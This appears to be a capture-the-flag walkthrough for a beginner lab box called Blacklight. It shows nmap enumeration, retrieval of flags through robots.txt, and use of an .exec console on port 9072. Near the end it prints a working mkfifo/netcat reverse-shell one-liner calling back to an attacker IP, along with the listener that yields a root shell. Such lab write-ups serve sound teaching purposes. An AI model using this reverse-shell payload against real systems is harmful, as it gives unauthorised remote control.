
# Table of Contents

1.  [Enumeration](#orgcb233c8)
2.  [Footprinting](#org315beb0)
    1.  [80 http](#orga913910)
    2.  [9072 unknown](#org659b846)



<a id="orgcb233c8"></a>

# Enumeration

We start the work with a simple `Host scan` to understand if the hosts is up.

    sudo nmap -sn  192.168.125.150

<span class="underline">Output</span>:

    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 09:10 EST
    Nmap scan report for 192.168.125.150
    Host is up (0.042s latency).
    Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds

<span class="underline">Output</span>:

    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-23 09:12 EST
    Nmap scan report for 192.168.125.150
    Host is up (0.094s latency).
    Not shown: 999 closed tcp ports (reset)
    PORT   STATE SERVICE
    80/tcp open  http
    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
    TCP/IP fingerprint:
    OS:SCAN(V=7.94SVN%E=4%D=2/23%OT=80%CT=1%CU=36568%PV=Y%DS=3%DC=I%G=Y%TM=65D8
    OS:A7CC%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%CI=I%II=I%TS=A)
    OS:OPS(O1=M557ST11NW6%O2=M557ST11NW6%O3=M557NNT11NW6%O4=M557ST11NW6%O5=M557
    OS:ST11NW6%O6=M557ST11)WIN(W1=6D38%W2=6D38%W3=6D38%W4=6D38%W5=6D38%W6=6D38)
    OS:ECN(R=Y%DF=Y%T=40%W=6E28%O=M557NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%
    OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
    OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=
    OS:Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK
    OS:=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
    
    Network Distance: 3 hops
    
    OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 14.49 seconds

The host is <span class="underline">up</span> and we have just find one port, the 80 HTTP.
Now we need to find more informations about the host lisks which port are opens.
So let'continue the enumertion with full TCP ports scan.

    nmap -sC -sV 192.168.125.150 -p- --reason 

<span class="underline">Output</span>:

    <SNIP>
    PORT     STATE SERVICE REASON  VERSION
    80/tcp   open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: BLACKLIGHT
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    9072/tcp open  unknown syn-ack
    | fingerprint-strings: 
    |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
    |_    BLACKLIGHT console mk1. Type .help for instructions
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    <SNIP

We have finds some intersting informetions about the hosts.
It has two open ports:
`80 HTTP` running an Apache https with 2.4.29 versions.
`9072 unknown`, it isn't a standard port, from the nmap maybe some interaction protocol via terminal.


<a id="org315beb0"></a>

# Footprinting


<a id="orga913910"></a>

## 80 http

We start by looking for a connection to the web server.
![img](./pics/web.png)

Except for some information about the other the only good stuff is a phrese that say that: "<sub>You</sub> are already close to the first flag. The web is the way.\_"
before enumerating with arrogance let’s try some classical things.

    curl -X GET 192.168.125.150/robots.txt

<span class="underline">Output</span>:

    User-agent: *
    flag1.txt
    blacklight.dict

Okey, simple, the first flag is taken.

    curl -X GET 192.168.125.150/flag1.txt

<span class="underline">Output</span>:

    {flag1:<redacted>}
    
    9072. The secret is at home.

And other hint!

Another interrupting thing made available by the web server is a dict, let’s take it.

    wget 192.168.125.150/blacklight.dict

    wc -l blacklight.dict 

<span class="underline">Output</span>:

    398 blacklight.dict

We have in hand a list with 398 entries.


<a id="org659b846"></a>

## 9072 unknown

Let's check more carefully the port 9072 for try to find other stuff.
We dosen't know what's behind the port, but nmap output has give to us an interesting string.

    BLACKLIGHT console mk1. Type .help for instructions	

It's look likes an interaction via terminal whit the service, there's nothing left to try.

    nc 192.168.125.150 9072

<span class="underline">Output</span>:

    BLACKLIGHT console mk1. Type .help for instructions

As we expected the connection was established and is waiting for our input.
we will immediately enter `.help` to understand what we are offered.

    BLACKLIGHT console mk1. Type .help for instructions
    .help 
    .readhash - Get one step closer
    .exec <cmd> - Execute commands
    .quit - Exit the server
    .exec ls
    You have one more command until the server shuts down. Choose wisely!

We are offered three comands, `.readhash`, `.exec`, `.quit`, the `.exec` immediately attracts attention but trying we realize that it runs a specific command that we do not know and also gives us a last attempt to try, what will happen next?
It’s not worth it, the hash command looks interrupting, let’s try it

    .readhash
    b5f4723bd6df85b54b0905bd6d734be9ef1cc1eb977413a932a828b5c52ef5a6
    Bye!

We have just found aa `hash`, this is very important, let's save it for later.

    echo 'b5f4723bd6df85b54b0905bd6d734be9ef1cc1eb977413a932a828b5c52ef5a6' > hash.unknown

Really interesting the behavior of the service, once closed the connection will also be closed the port, we did well not to dare with . exec.

    nmap -sC 192.168.125.150 -p 9072   

<span class="underline">Output</span>:

    Nmap scan report for 192.168.125.150
    Host is up (0.047s latency).
    
    PORT     STATE  SERVICE
    9072/tcp closed unknown
    
    Nmap done: 1 IP address (1 host up) scanned in 0.25 seconds

Being curious to understand thoroughly I decided to restart the car and try a second way.
create a payload for a reverse shell.

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.3.177.13 4444 >/tmp/f

<span class="underline">Start Listener</span>

    nc -nlvp 4444

<span class="underline">Output</span>:

    192.168.125.150: inverse host lookup failed: Unknown host
    connect to [192.168.125.150] from (UNKNOWN) [192.168.125.150] 57228
    /bin/sh: 0: can't access tty; job control turned off
    # whoami
    root

Blacklight is a very easy challenge. It is only suitable for absolute beginners. I wish if the author had integrated some exploitation scenarios or privilege escalation vectors to the box.